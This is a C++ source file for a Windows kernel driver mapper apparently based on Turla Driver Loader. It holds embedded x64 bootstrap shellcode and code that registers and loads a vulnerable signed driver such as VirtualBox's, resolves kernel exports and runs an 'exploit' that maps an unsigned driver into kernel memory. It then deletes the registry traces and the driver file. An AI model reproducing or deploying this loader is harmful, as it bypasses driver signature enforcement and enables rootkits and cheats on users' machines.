#include "MapperExecutor.h"
#include "../DriverParse.h"

#define MAX_SHELLCODE_LENGTH 0x300

uint32_t g_NtBuildNumber = 0;
static uintptr_t g_KernelImg = 0;
static uint8_t* g_KerneBase = nullptr;

static const unsigned char  sTDLBootstrapLoader_code_w10rs2[ 321 ] = {
	// 2820D53000A ->   push rbx
	0x40, 0x53, /*1*/
	// 2820D53000C ->   push rbp
	0x55, /*2*/
	// 2820D53000D ->   push rsi
	0x56, /*3*/
	// 2820D53000E ->   sub rsp,20 { 32 }
	0x48, 0x83, 0xEC, 0x20, /*7*/
	// 2820D530012 ->   mov r9,rcx
	0x4C, 0x8B, 0xC9, /*10*/
	// 2820D530015 ->   mov [rsp+50],r15
	0x4C, 0x89, 0x7C, 0x24, 0x50, /*15*/
	// 2820D53001A ->   lea rbx,[2820D53000A] { ["@SUVH?? L??L?|$PH?????3?H??"] }
	0x48, 0x8D, 0x1D, 0xE9, 0xFF, 0xFF, 0xFF, /*22*/
	// 2820D530021 ->   xor ecx,ecx
	0x33, 0xC9, /*24*/
	// 2820D530023 ->   add rbx,00000300 { 768 }
	0x48, 0x81, 0xC3, 0x00, 0x03, 0x00, 0x00, /*31*/
	// 2820D53002A ->   mov r8d,536C6454 { "TdlS" } //53 6D 6F 4C = SmoL
	0x41, 0xB8, 0x4C, 0x6F, 0x6D, 0x53, /*37*/
	// 2820D530030 ->   movsxd  rbp,dword Ptr [rbx+3C]
	0x48, 0x63, 0x6B, 0x3C, /*41*/
	// 2820D530034 ->   add rbp,rbx
	0x48, 0x03, 0xEB, /*44*/
	// 2820D530037 ->   mov r15d,[rbp+50]
	0x44, 0x8B, 0x7D, 0x50, /*48*/
	// 2820D53003B ->   lea edx,[r15+00001000]
	0x41, 0x8D, 0x97, 0x00, 0x10, 0x00, 0x00, /*55*/
	// 2820D530042 ->   call r9
	0x41, 0xFF, 0xD1, /*58*/
	// 2820D530045 ->   lea rsi,[rax+00001000]
	0x48, 0x8D, 0xB0, 0x00, 0x10, 0x00, 0x00, /*65*/
	// 2820D53004C ->   and rsi,FFFFF000 { 
	0x48, 0x81, 0xE6, 0x00, 0xF0, 0xFF, 0xFF, /*72*/
	// 2820D530053 ->   cmp dword Ptr [rbp+00000084],05 { 5 }
	0x83, 0xBD, 0x84, 0x00, 0x00, 0x00, 0x05, /*79*/
	// 2820D53005A ->   jbe 2820D530105
	0x0F, 0x86, 0xA5, 0x00, 0x00, 0x00, /*85*/
	// 2820D530060 ->   mov ecx,[rbp+000000B0]
	0x8B, 0x8D, 0xB0, 0x00, 0x00, 0x00, /*91*/
	// 2820D530066 ->   test ecx,ecx
	0x85, 0xC9, /*93*/
	// 2820D530068 ->   je 2820D530105
	0x0F, 0x84, 0x97, 0x00, 0x00, 0x00, /*99*/
	// 2820D53006E ->   mov [rsp+40],rdi
	0x48, 0x89, 0x7C, 0x24, 0x40, /*104*/
	// 2820D530073 ->   lea r8,[rbx+rcx]
	0x4C, 0x8D, 0x04, 0x0B, /*108*/
	// 2820D530077 ->   mov r11,rsi
	0x4C, 0x8B, 0xDE, /*111*/
	// 2820D53007A ->   mov [rsp+48],r14
	0x4C, 0x89, 0x74, 0x24, 0x48, /*116*/
	// 2820D53007F ->   sub r11,[rbp+30]
	0x4C, 0x2B, 0x5D, 0x30, /*120*/
	// 2820D530083 ->   xor edi,edi
	0x33, 0xFF, /*122*/
	// 2820D530085 ->   mov r14d,[rbp+000000B4]
	0x44, 0x8B, 0xB5, 0xB4, 0x00, 0x00, 0x00, /*129*/
	// 2820D53008C ->   test r14d,r14d
	0x45, 0x85, 0xF6, /*132*/
	// 2820D53008F ->   je 2820D5300FB
	0x74, 0x6A, /*134*/
	// 2820D530091 ->   nop [rax+rax+00000000]
	0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, /*143*/
	// 2820D53009A ->   mov r9d,00000008 { 8 }
	0x41, 0xB9, 0x08, 0x00, 0x00, 0x00, /*149*/
	// 2820D5300A0 ->   lea r10,[r8+08]
	0x4D, 0x8D, 0x50, 0x08, /*153*/
	// 2820D5300A4 ->   cmp [r8+04],r9d
	0x45, 0x39, 0x48, 0x04, /*157*/
	// 2820D5300A8 ->   jna 2820D5300ED
	0x76, 0x43, /*159*/
	// 2820D5300AA ->   movzx eax,word Ptr [r10]
	0x41, 0x0F, 0xB7, 0x02, /*163*/
	// 2820D5300AE ->   mov ecx,eax
	0x8B, 0xC8, /*165*/
	// 2820D5300B0 ->   shr ecx,0C { 12 }
	0xC1, 0xE9, 0x0C, /*168*/
	// 2820D5300B3 ->   cmp ecx,03 { 3 }
	0x83, 0xF9, 0x03, /*171*/
	// 2820D5300B6 ->   je 2820D5300CF
	0x74, 0x17, /*173*/
	// 2820D5300B8 ->   cmp ecx,0A { 10 }
	0x83, 0xF9, 0x0A, /*176*/
	// 2820D5300BB ->   jne 2820D5300DF
	0x75, 0x22, /*178*/
	// 2820D5300BD ->   mov edx,[r8]
	0x41, 0x8B, 0x10, /*181*/
	// 2820D5300C0 ->   and eax,00000FFF { 4095 }
	0x25, 0xFF, 0x0F, 0x00, 0x00, /*186*/
	// 2820D5300C5 ->   lea rcx,[rbx+rax]
	0x48, 0x8D, 0x0C, 0x03, /*190*/
	// 2820D5300C9 ->   add [rdx+rcx],r11
	0x4C, 0x01, 0x1C, 0x0A, /*194*/
	// 2820D5300CD ->   jmp 2820D5300DF
	0xEB, 0x10, /*196*/
	// 2820D5300CF ->   mov edx,[r8]
	0x41, 0x8B, 0x10, /*199*/
	// 2820D5300D2 ->   and eax,00000FFF { 4095 }
	0x25, 0xFF, 0x0F, 0x00, 0x00, /*204*/
	// 2820D5300D7 ->   lea rcx,[rbx+rax]
	0x48, 0x8D, 0x0C, 0x03, /*208*/
	// 2820D5300DB ->   add [rdx+rcx],r11d
	0x44, 0x01, 0x1C, 0x0A, /*212*/
	// 2820D5300DF ->   add r10,02 { 2 }
	0x49, 0x83, 0xC2, 0x02, /*216*/
	// 2820D5300E3 ->   add r9d,02 { 2 }
	0x41, 0x83, 0xC1, 0x02, /*220*/
	// 2820D5300E7 ->   cmp r9d,[r8+04]
	0x45, 0x3B, 0x48, 0x04, /*224*/
	// 2820D5300EB ->   jb 2820D5300AA
	0x72, 0xBD, /*226*/
	// 2820D5300ED ->   mov eax,[r8+04]
	0x41, 0x8B, 0x40, 0x04, /*230*/
	// 2820D5300F1 ->   add edi,eax
	0x03, 0xF8, /*232*/
	// 2820D5300F3 ->   add r8,rax
	0x4C, 0x03, 0xC0, /*235*/
	// 2820D5300F6 ->   cmp edi,r14d
	0x41, 0x3B, 0xFE, /*238*/
	// 2820D5300F9 ->   jb 2820D53009A
	0x72, 0x9F, /*240*/
	// 2820D5300FB ->   mov rdi,[rsp+40]
	0x48, 0x8B, 0x7C, 0x24, 0x40, /*245*/
	// 2820D530100 ->   mov r14,[rsp+48]
	0x4C, 0x8B, 0x74, 0x24, 0x48, /*250*/
	// 2820D530105 ->   mov rdx,r15
	0x49, 0x8B, 0xD7, /*253*/
	// 2820D530108 ->   mov r15,[rsp+50]
	0x4C, 0x8B, 0x7C, 0x24, 0x50, /*258*/
	// 2820D53010D ->   shr rdx,03 { 3 }
	0x48, 0xC1, 0xEA, 0x03, /*262*/
	// 2820D530111 ->   test rdx,rdx
	0x48, 0x85, 0xD2, /*265*/
	// 2820D530114 ->   je 2820D53013B
	0x74, 0x25, /*267*/
	// 2820D530116 ->   mov rcx,rsi
	0x48, 0x8B, 0xCE, /*270*/
	// 2820D530119 ->   sub rbx,rsi
	0x48, 0x2B, 0xDE, /*273*/
	// 2820D53011C ->   nop [rax+00]
	0x0F, 0x1F, 0x40, 0x00, /*277*/
	// 2820D530120 ->   nop [rax+rax+00000000]
	0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, /*287*/
	// 2820D53012A ->   mov rax,[rbx+rcx]
	0x48, 0x8B, 0x04, 0x0B, /*291*/
	// 2820D53012E ->   mov [rcx],rax
	0x48, 0x89, 0x01, /*294*/
	// 2820D530131 ->   lea rcx,[rcx+08]
	0x48, 0x8D, 0x49, 0x08, /*298*/
	// 2820D530135 ->   sub rdx,01 { 1 }
	0x48, 0x83, 0xEA, 0x01, /*302*/
	// 2820D530139 ->   jne 2820D53012A
	0x75, 0xEF, /*304*/
	// 2820D53013B ->   mov eax,[rbp+28]
	0x8B, 0x45, 0x28, /*307*/
	// 2820D53013E ->   add rax,rsi
	0x48, 0x03, 0xC6, /*310*/
	// 2820D530141 ->   add rsp,20 { 32 }
	0x48, 0x83, 0xC4, 0x20, /*314*/
	// 2820D530145 ->   pop rsi
	0x5E, /*315*/
	// 2820D530146 ->   pop rbp
	0x5D, /*316*/
	// 2820D530147 ->   pop rbx
	0x5B, /*317*/
	// 2820D530148 ->   jmp rax
	0x48, 0xFF, 0xE0 /*320*/
};

uint32_t WriteBufferToFile( PWSTR FileName, void* pBuffer, int Size, bool Flush, bool Append )
{

	HANDLE             hFile = nullptr;

	OBJECT_ATTRIBUTES  objAttr {};

	UNICODE_STRING     ntFileName;

	IO_STATUS_BLOCK    ioStatus;

	int BlockSize = 0;

	auto Ptr = r_cast<uint8_t*>( pBuffer );

	uint32_t wBytes = 0;

	if ( !RtlDosPathNameToNtPathName_U( FileName, &ntFileName, nullptr, nullptr ) )
		return 0;

	auto DesireAccess = FILE_WRITE_ACCESS | SYNCHRONIZE;

	auto iFlag = FILE_OVERWRITE_IF;

	if ( Append )
	{
		DesireAccess |= FILE_READ_ACCESS;

		iFlag = FILE_OPEN_IF;
	}

	InitializeObjectAttributes( &objAttr, &ntFileName, OBJ_CASE_INSENSITIVE, 0, nullptr );

	__try {

		auto Status = NtCreateFile( &hFile, DesireAccess, &objAttr, &ioStatus, nullptr, FILE_ATTRIBUTE_NORMAL, 0, iFlag, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, nullptr, 0 );

		if ( !NT_SUCCESS( Status ) )
			__leave;

		PLARGE_INTEGER pPos = nullptr;

		LARGE_INTEGER  pos {};

		if ( Append )
		{
			pos.LowPart = FILE_WRITE_TO_END_OF_FILE;

			pos.HighPart = -1;

			pPos = &pos;
		}

		if ( Size < 0x80000000 )
		{
			BlockSize = Size;

			Status = NtWriteFile( hFile, 0, nullptr, nullptr, &ioStatus, Ptr, BlockSize, pPos, nullptr );

			if ( !NT_SUCCESS( Status ) )
				__leave;

			wBytes += *reinterpret_cast<uint32_t*>( &ioStatus.Information );
		}
		else
		{
			BlockSize = 0x7FFFFFFF;

			auto nBlocks = ( Size / BlockSize );

			for ( auto BlockIndex = 0; BlockIndex < nBlocks; BlockIndex++ ) {

				Status = NtWriteFile( hFile, 0, nullptr, nullptr, &ioStatus, Ptr, BlockSize, pPos, nullptr );

				if ( !NT_SUCCESS( Status ) )
					__leave;

				Ptr += BlockSize;

				wBytes += *reinterpret_cast<uint32_t*>( &ioStatus.Information );
			}

			auto RemainngSize = ( Size % BlockSize );

			if ( RemainngSize )
			{
				Status = NtWriteFile( hFile, 0, nullptr, nullptr, &ioStatus, Ptr, RemainngSize, pPos, nullptr );

				if ( !NT_SUCCESS( Status ) )
					__leave;

				wBytes += *reinterpret_cast<uint32_t*>( &ioStatus.Information );
			}
		}
	}
	__finally {

		if ( hFile != nullptr )
		{
			if ( Flush )
				NtFlushBuffersFile( hFile, &ioStatus );

			NtClose( hFile );
		}

		RtlFreeUnicodeString( &ntFileName );
	}
	return wBytes;
}

void* GetSysInfo( SYSTEM_INFORMATION_CLASS InfoClass )
{
	void* pBuffer = nullptr;

	NTSTATUS    Status;

	ULONG       MemIo;

	auto		hHeap = NtCurrentPeb( )->ProcessHeap;

	ULONG		Size = 0x1000;
	do {
		pBuffer = RtlAllocateHeap( hHeap, HEAP_ZERO_MEMORY, Size );

		if ( pBuffer == nullptr )
			return nullptr;

		Status = NtQuerySystemInformation( InfoClass, pBuffer, Size, &MemIo );

		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
		{
			RtlFreeHeap( hHeap, 0, pBuffer );

			pBuffer = nullptr;

			Size += 0x10000;
		}
		else if ( !NT_SUCCESS( Status ) )
		{
			RtlFreeHeap( hHeap, 0, pBuffer );
			return nullptr;
		}

	} while ( Status == STATUS_INFO_LENGTH_MISMATCH );

	if ( NT_SUCCESS( Status ) )
		return pBuffer;

	if ( pBuffer )
		RtlFreeHeap( hHeap, 0, pBuffer );

	return nullptr;
}


static uint8_t* GetNtOsBase( )
{
	uint8_t* NtOsBase = nullptr;

	auto miSpace = r_cast<PRTL_PROCESS_MODULES>( GetSysInfo( SystemModuleInformation ) );

	if ( miSpace )
	{
		NtOsBase = r_cast<uint8_t*>( miSpace->Modules[ 0 ].ImageBase );

		LOG_SEC( "[!] - [Mapper] NtOsBase 0x%p", NtOsBase );

		RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, miSpace );
	}

	return NtOsBase;
}

bool GetPrivilege( ULONG priv_val, BOOLEAN Enable )
{
	BOOLEAN old_val;
	return  ( RtlAdjustPrivilege( priv_val, Enable, FALSE, &old_val ) == 0 );
}

ULONG GetBuildNumber( ) {

	RTL_OSVERSIONINFOW osInfo{};

	osInfo.dwOSVersionInfoSize = sizeof( RTL_OSVERSIONINFOW );

	const NTSTATUS Status = RtlGetVersion( &osInfo );

	if ( !NT_SUCCESS( Status ) )
	{
		return 0;
	}

	return osInfo.dwBuildNumber;
}

NTSTATUS LoadAndUnload( const char* strDrvName, const char* strDrvPath, bool load, bool vmInstalled )
{
	/*
	0xC000007b == Core isolation is enabled, VirtualBox drivers cannot be loaded
	* 
	0xC0000035
	VBoxUSBMon.sys
STATUS_OBJECT_NAME_COLLISION
VBoxSup.sys	FFFFF801`0BE00000	FFFFF801`0BF2C000	0x0012c000	1	95	System Driver	VirtualBox Support Driver	7.1.6.17084	Oracle and/or its affiliates	Oracle VirtualBox	21/01/2025 06:13:32 a. m.	21/01/2025 06:13:32 a. m.	C:\WINDOWS\System32\drivers\VBoxSup.sys	A	VBoxSup	@oem11.inf,%VBoxSup.SVCDESC%;VirtualBox Service
	*/
	char strKey[ 200 ] = { 0 };

	char drvPath[ 256 ] = { 0 };

	UNICODE_STRING uniPath = { 0 };

	CANSI_STRING ansiPath = { 0 };

	HKEY hkRet = nullptr;

	uint8_t Data[ 4 ] = { 1,0,0,0 };

	GetPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE );

	if ( !GetFullPathNameA( strDrvPath, 256, drvPath, nullptr ) )
		return 1;

	auto buffLen = sprintf_s( strKey, pstra( R"(System\CurrentControlSet\Services\%s)" ), strDrvName );

	if ( !vmInstalled )
	{
		auto Status = RegCreateKeyA( HKEY_LOCAL_MACHINE, strKey, &hkRet );

		if ( Status != ERROR_SUCCESS )
			return 2;

		Status = RegSetValueExA( hkRet, pstra( "Type" ), 0, 4, Data, 4 );

		Status = RegSetValueExA( hkRet, pstra( "ErrorControl" ), 0, 4, Data, 4 );

		Status = RegSetValueExA( hkRet, pstra( "Start" ), 0, 4, Data, 4 );

		buffLen = sprintf_s( strKey, pstra( "\\??\\%s" ), drvPath );

		Status = RegSetValueExA( hkRet, pstra( "ImagePath" ), 0, 1, r_cast<BYTE*>( strKey ), buffLen );

		RegCloseKey( hkRet );
	}

	buffLen = sprintf_s( strKey, pstra( R"(\Registry\Machine\System\CurrentControlSet\Services\%s)" ), strDrvName );

	ansiPath.Buffer = r_cast<PCHAR>( strKey );

	ansiPath.Length = *reinterpret_cast<SHORT*>( &buffLen );

	auto Status = RtlAnsiStringToUnicodeString( &uniPath, &ansiPath, 1 );

	if ( NT_SUCCESS( Status ) )
	{
		Status = ( load ) ? NtLoadDriver( &uniPath ) : NtUnloadDriver( &uniPath );

		if ( load && Status == STATUS_IMAGE_ALREADY_LOADED )
		{
			if ( 0 <= ( Status = NtUnloadDriver( &uniPath ) ) )
				Status = NtLoadDriver( &uniPath );
		}

		RtlFreeUnicodeString( &uniPath );
	}

	if ( !vmInstalled )
	{
		buffLen = sprintf_s( strKey, pstra( "%s%s\\Enum" ), pstra( R"(System\CurrentControlSet\Services\)" ), strDrvName );

		RegDeleteKeyA( HKEY_LOCAL_MACHINE, strKey );

		buffLen = sprintf_s( strKey, pstra( "%s%s\\Security" ), pstra( R"(System\CurrentControlSet\Services\)" ), strDrvName );

		RegDeleteKeyA( HKEY_LOCAL_MACHINE, strKey );

		buffLen = sprintf_s( strKey, pstra( "%s%s" ), pstra( R"(System\CurrentControlSet\Services\)" ), strDrvName );

		RegDeleteKeyA( HKEY_LOCAL_MACHINE, strKey );
	}

	if ( !load )
	{
		buffLen = sprintf_s( strKey, pstra( R"(\\.\%s)" ), strDrvName );

		DeleteFileA( strDrvPath );
	}

	return Status;
}

uintptr_t __fastcall NtGetProcAddress( LPCSTR FuncName )
{
	ANSI_STRING    ansiStr {};

	uintptr_t      pfn = 0;

	RtlInitString( &ansiStr, FuncName );

	if ( !NT_SUCCESS( LdrGetProcedureAddress( r_cast<void*>( g_KernelImg ), &ansiStr, 0, r_cast<void**>( &pfn ) ) ) )
		return 0;

	return r_cast<uintptr_t>( g_KerneBase + ( pfn - g_KernelImg ) );
}

NTSTATUS InitializeMapperRuntime( )
{
	Tools::EnableDebugPrivilege( true );

	OSVERSIONINFO osv {};
	RtlSecureZeroMemory( &osv, sizeof osv );
	osv.dwOSVersionInfoSize = sizeof osv;

	auto Status = RtlGetVersion( r_cast<PRTL_OSVERSIONINFOW>( &osv ) );

	if ( Status )
	{
		LOG_SEC( "[-] - [Mapper] Ldr: RtlGetVersion failed" );
		return 8080;
	}

	if ( osv.dwMajorVersion < 6 )
		return 8080;

	g_NtBuildNumber = osv.dwBuildNumber;

	LOG_SEC( "[!] - [Mapper] Ldr: Windows v %d.%d, build %d", osv.dwMajorVersion, osv.dwMinorVersion, osv.dwBuildNumber );

	return STATUS_SUCCESS;
}

NTSTATUS MapDriverWithBackend( IMapperBackend& backend, void* pDrvData, size_t szDataSize )
{
	uintptr_t uOffset_ExAllocatePoolWithTag = 0;

	uintptr_t uOffset_PsCreateSystemThread = 0;

	uintptr_t uOffset_ZwClose = 0;

	UNICODE_STRING uniStr {};

	g_KerneBase = GetNtOsBase( );

	if ( !g_KerneBase )
		return 8383;

	LOG_SEC( "[!] - [%s] Ldr: Kernel base = 0x%p", backend.Name( ), g_KerneBase );

	RtlInitUnicodeString( &uniStr, pstrw( L"ntoskrnl.exe" ) );

	auto Status = LdrLoadDll( nullptr, nullptr, &uniStr, r_cast<void**>( &g_KernelImg ) );

	if ( !NT_SUCCESS( Status ) || !g_KernelImg )
	{
		LOG_SEC( "[-] - [%s] Ldr: Error while loading ntoskrnl.exe", backend.Name( ) );
		return 8484;
	}
	else {
		LOG_SEC( "[!] - [%s] Ldr: ntoskrnl.exe loaded at 0x%I64X", backend.Name( ), g_KernelImg );
	}

	ANSI_STRING			RoutineName {};

	RtlInitString( &RoutineName, pstra( "ExAllocatePoolWithTag" ) );

	Status = LdrGetProcedureAddress( r_cast<void*>( g_KernelImg ), &RoutineName, 0, r_cast<void**>( &uOffset_ExAllocatePoolWithTag ) );

	if ( !NT_SUCCESS( Status ) || !uOffset_ExAllocatePoolWithTag )
	{
		LOG_SEC( "[-] - [%s] Ldr: Error, ExAllocatePoolWithTag address not found", backend.Name( ) );
		return 8585;
	}

	uOffset_ExAllocatePoolWithTag -= g_KernelImg;
	LOG_SEC( "[!] - [%s] Ldr: ExAllocatePoolWithTag 0x%I64X", backend.Name( ), uOffset_ExAllocatePoolWithTag );

	if ( g_NtBuildNumber < 15063 )
	{
		RtlInitString( &RoutineName, pstra( "PsCreateSystemThread" ) );

		Status = LdrGetProcedureAddress( r_cast<void*>( g_KernelImg ), &RoutineName, 0, r_cast<void**>( &uOffset_PsCreateSystemThread ) );

		if ( !NT_SUCCESS( Status ) || !uOffset_PsCreateSystemThread )
		{
			LOG_SEC( "[-] - [%s] Ldr: Error, PsCreateSystemThread address not found", backend.Name( ) );
			return 8686;
		}

		uOffset_PsCreateSystemThread -= g_KernelImg;
		LOG_SEC( "[!] - [%s] Ldr: PsCreateSystemThread 0x%I64X", backend.Name( ), uOffset_PsCreateSystemThread );

		RtlInitString( &RoutineName, pstra( "ZwClose" ) );

		Status = LdrGetProcedureAddress( r_cast<void*>( g_KernelImg ), &RoutineName, 0, r_cast<void**>( &uOffset_ZwClose ) );

		if ( !NT_SUCCESS( Status ) || !uOffset_ZwClose )
		{
			LOG_SEC( "[-] - [%s] Ldr: Error, ZwClose address not found", backend.Name( ) );
			return 8787;
		}

		uOffset_ZwClose -= g_KernelImg;
		LOG_SEC( "[!] - [%s] Ldr: ZwClose 0x%I64X", backend.Name( ), uOffset_ZwClose );
	}

	auto MyDrv = new DriverParse( pDrvData, szDataSize );

	uint8_t* pBuffer = nullptr;

	auto MemIo = MyDrv->GetImgSize( ) + PAGE_SIZE;

	NtAllocateVirtualMemory( NtCurrentProcess( ), r_cast<void**>( &pBuffer ), 0, &MemIo, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	if ( !pBuffer )
	{
		LOG_SEC( "[-] - [%s] Ldr: Error, unable to allocate shellCode", backend.Name( ) );
		delete MyDrv;
		return 8888;
	}
	else
		LOG_SEC( "[!] - [%s] Ldr: shellCode allocated at 0x%p", backend.Name( ), pBuffer );

	uint32_t PrologueSize = 0;

	pBuffer[ 0x00 ] = 0x48;

	pBuffer[ 0x01 ] = 0xb9;

	*( r_cast<uintptr_t*>( &pBuffer[ 2 ] ) ) = r_cast<uintptr_t>( g_KerneBase + uOffset_ExAllocatePoolWithTag );

	if ( g_NtBuildNumber < 15063 )
	{
		pBuffer[ 0x0a ] = 0x48;

		pBuffer[ 0x0b ] = 0xba;

		*( r_cast<uintptr_t*>( &pBuffer[ 0x0c ] ) ) = r_cast<uintptr_t>( g_KerneBase + uOffset_PsCreateSystemThread );

		pBuffer[ 0x14 ] = 0x49;

		pBuffer[ 0x15 ] = 0xb8;

		*( r_cast<uintptr_t*>( &pBuffer[ 0x16 ] ) ) = r_cast<uintptr_t>( g_KerneBase + uOffset_ZwClose );

		PrologueSize = 0x1e;
	}
	else
		PrologueSize = 0x0a;

	uint32_t data_offset = PrologueSize + MAX_SHELLCODE_LENGTH;

	memcpy( pBuffer + PrologueSize, sTDLBootstrapLoader_code_w10rs2, sizeof sTDLBootstrapLoader_code_w10rs2 );
	LOG_SEC( "[!] - [%s] Ldr: Windows 10 RS2+ bootstrap shellCode selected", backend.Name( ) );
	
	auto vParsedDrv = MyDrv->GetMappedDrv( NtGetProcAddress );

	if ( vParsedDrv.empty( ) )
	{
		LOG_SEC( "[-] - [%s] PARSE FAIL", backend.Name( ) );
		delete MyDrv;

		if ( pBuffer )
		{
			MemIo = 0;
			NtFreeVirtualMemory( NtCurrentProcess( ), reinterpret_cast<PVOID*>( &pBuffer ), &MemIo, MEM_RELEASE );
		}

		return 8989;
	}

	memcpy( pBuffer + data_offset, vParsedDrv.data( ), MyDrv->GetImgSize( ) );

	LOG_SEC( "[!] - [%s] Ldr: Executing exploit", backend.Name( ) );

	auto Result = backend.Execute( pBuffer, static_cast<uint32_t>( MyDrv->GetImgSize( ) + PAGE_SIZE ) );

	if ( pBuffer )
	{
		MemIo = 0;

		NtFreeVirtualMemory( NtCurrentProcess( ), reinterpret_cast<PVOID*>( &pBuffer ), &MemIo, MEM_RELEASE );
	}

	delete MyDrv;

	return Result;
}

NTSTATUS RunMapperBackend( IMapperBackend& backend, void* pDrvData, size_t szDataSize, bool bClean )
{
	auto status = backend.Load( );

	if ( status != STATUS_SUCCESS )
	{
		LOG_SEC( "[-] - [%s] Backend load failed Status %X", backend.Name( ), status );

		NTSTATUS statusUnload = backend.Unload( );

		LOG_SEC( "[*] - [%s] Backend unload Status %X", backend.Name( ), statusUnload );
		return status;
	}

	const auto result = MapDriverWithBackend( backend, pDrvData, szDataSize );

	LOG_SEC( "[*] - [%s] Backend unload Status %X", backend.Name( ), status );

	if ( result == 0 )
	{
		//if ( bClean )
		//{
		//	if ( !backend.Clean( ) )
		//	{
		//		LOG_SEC( "[-] - [%s] Backend clean failed", backend.Name( ) );
		//		return 999666;
		//	}
		//}
	}

	status = backend.Unload( );

	LOG_SEC( "[*] - [%s] Backend unload Status %X", backend.Name( ), status );



	return result;
}

